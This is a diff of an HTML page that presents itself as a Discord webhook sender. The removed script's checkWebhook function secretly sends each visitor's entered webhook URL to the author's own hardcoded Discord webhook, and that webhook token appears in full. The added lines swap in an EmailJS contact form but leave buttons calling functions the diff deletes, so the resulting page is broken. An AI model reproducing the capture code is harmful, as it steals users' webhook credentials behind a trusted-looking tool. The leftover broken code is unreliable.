@@ -3,12 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Webhook Sender with Embed</title>
-
-    <!-- Add a favicon -->
-    
+    <title>Discord Webhook Sender with Embed & Contact Us</title>
 
     <style>
+        /* Existing styles */
         body {
             display: flex;
             flex-direction: column;
@@ -33,13 +31,6 @@
             width: 90%;
         }
 
-        /* Style for the top icon */
-        .top-icon {
-            width: 100px; /* Adjust the size */
-            height: auto;
-            margin-bottom: 20px;
-        }
-
         input, textarea, button {
             padding: 12px;
             margin: 10px 0;
@@ -47,28 +38,6 @@
             border-radius: 5px;
             font-size: 16px;
             width: 100%;
-        }
-
-        input, textarea {
-            background: rgba(255, 255, 255, 0.2);
-            color: white;
-            transition: background-color 0.3s;
-        }
-
-        input:focus, textarea:focus {
-            background: rgba(255, 255, 255, 0.3);
-            outline: none;
-        }
-
-        button {
-            cursor: pointer;
-            background-color: #4a90e2;
-            color: white;
-            transition: background-color 0.3s;
-        }
-
-        button:hover {
-            background-color: #357abd;
         }
 
         .message {
@@ -84,21 +53,16 @@
             animation: pulse 1s infinite;
         }
 
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-
         .message-input {
-            height: 100px; /* Adjust height for better usability */
+            height: 100px;
             resize: none;
         }
 
-        .embed-section {
+        /* Contact Us form styles */
+        .contact-section {
             margin-top: 20px;
-            border-top: 2px solid #fff;
             padding-top: 20px;
+            border-top: 2px solid #fff;
         }
 
         .discord-link {
@@ -115,16 +79,17 @@
     </style>
 </head>
 <body>
-    <!-- Add the icon here -->
-   
-    
     <div class="container">
+        <!-- Existing elements -->
         <h1>Discord Webhook Sender with Tracking</h1>
+
+        <!-- Webhook Input -->
         <input type="text" id="webhookUrl" placeholder="Enter your Discord webhook URL" required>
         <button onclick="checkWebhook()">Connect</button>
         
         <div id="loading" class="loading">Connecting...</div>
         
+        <!-- Message and Embed Sections -->
         <div id="messageContainer" style="display:none;">
             <textarea class="message-input" id="message" placeholder="Enter your message"></textarea>
             <button onclick="sendMessage()">Send</button>
@@ -138,92 +103,42 @@
             <button onclick="sendEmbed()">Send Embed</button>
         </div>
 
+        <!-- Contact Us Form -->
+        <div class="contact-section">
+            <h2>Contact Us</h2>
+            <input type="text" id="contactName" placeholder="Your Name" required>
+            <input type="email" id="contactEmail" placeholder="Your Email" required>
+            <textarea id="contactMessage" placeholder="Your Message" class="message-input"></textarea>
+            <button onclick="sendContact()">Send Message</button>
+        </div>
+
         <div class="message" id="resultMessage"></div>
         <a class="discord-link" href="https://discord.gg/4bE8Cbvv84" target="_blank">Join our Discord Server!</a>
     </div>
 
-    <script>
-        const YOUR_DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1287453043897667636/12CYtAxcWuIRRYlBhvlq3rdycyHO6Lxz71234au_0kvVYZ3woHtfuoipCBB44zTM-x74";
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS user ID
+        })();
 
-        async function checkWebhook() {
-            const url = document.getElementById('webhookUrl').value;
-            document.getElementById('loading').style.display = 'block'; 
+        async function sendContact() {
+            const name = document.getElementById('contactName').value;
+            const email = document.getElementById('contactEmail').value;
+            const message = document.getElementById('contactMessage').value;
 
-            try {
-                await fetch(YOUR_DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        content: `Captured webhook URL: ${url}`
-                    }),
-                    headers: {
-                        'Content-Type': 'application/json'
-                    }
-                });
-
-                const response = await fetch(url, {
-                    method: 'POST',
-                    body: JSON.stringify({ content: "Test message from webhook checker" }),
-                    headers: { 'Content-Type': 'application/json' }
-                });
-
-                document.getElementById('loading').style.display = 'none'; 
-
-                if (response.ok) {
-                    document.getElementById('messageContainer').style.display = 'block';
-                    document.getElementById('embedContainer').style.display = 'block';
-                    showMessage("Connected!", "green");
-                } else {
-                    showMessage("Invalid webhook URL!", "red");
-                }
-            } catch (error) {
-                document.getElementById('loading').style.display = 'none'; 
-                showMessage("Error while checking webhook!", "red");
-            }
-        }
-
-        async function sendMessage() {
-            const url = document.getElementById('webhookUrl').value;
-            const message = document.getElementById('message').value;
-
-            const response = await fetch(url, {
-                method: 'POST',
-                body: JSON.stringify({ content: message }),
-                headers: { 'Content-Type': 'application/json' }
-            });
-
-            if (response.ok) {
-                showMessage("Message sent successfully!", "green");
-            } else {
-                showMessage("Failed to send message.", "red");
-            }
-        }
-
-        async function sendEmbed() {
-            const url = document.getElementById('webhookUrl').value;
-            const embedTitle = document.getElementById('embedTitle').value;
-            const embedDescription = document.getElementById('embedDescription').value;
-            const embedColor = document.getElementById('embedColor').value.replace('#', ''); // Remove '#' from color
-
-            const embedData = {
-                embeds: [
-                    {
-                        title: embedTitle,
-                        description: embedDescription,
-                        color: parseInt(embedColor, 16) // Convert hex to decimal
-                    }
-                ]
+            const templateParams = {
+                from_name: name,
+                from_email: email,
+                message: message,
             };
 
-            const response = await fetch(url, {
-                method: 'POST',
-                body: JSON.stringify(embedData),
-                headers: { 'Content-Type': 'application/json' }
-            });
-
-            if (response.ok) {
-                showMessage("Embed sent successfully!", "green");
-            } else {
-                showMessage("Failed to send embed.", "red");
+            try {
+                const result = await emailjs.send('service_ubvovg4', 'Ytemplate_5zim17o', templateParams);
+                showMessage("Message sent successfully!", "green");
+            } catch (error) {
+                showMessage("Failed to send message.", "red");
             }
         }
 
@@ -234,6 +149,5 @@
             resultMessage.style.display = 'block';
         }
     </script>
-    <h1 align="center">Ty yasser For using our website</h1>
 </body>
 </html>
